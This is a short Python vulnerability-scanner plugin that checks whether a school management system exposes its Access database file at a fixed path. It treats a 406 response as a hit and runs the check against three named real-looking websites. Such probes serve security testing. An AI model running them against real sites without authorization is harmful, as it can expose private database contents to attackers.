#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-099335

def assign(service, arg):
    if service == "zhongdongli_school":
        return True, arg
        
        
def audit(arg):
    payload = 'Database/sq_xikeedu.mdb'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url,header='Accept:image/jpg')
    if code == 406:
        security_hole(url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('zhongdongli_school', 'http://www.gf79gh.com/')[1])
    audit(assign('zhongdongli_school', 'http://hqjt.em.swjtu.edu.cn/')[1])
    audit(assign('zhongdongli_school', 'http://www.dhslcj.com/')[1])


    
    

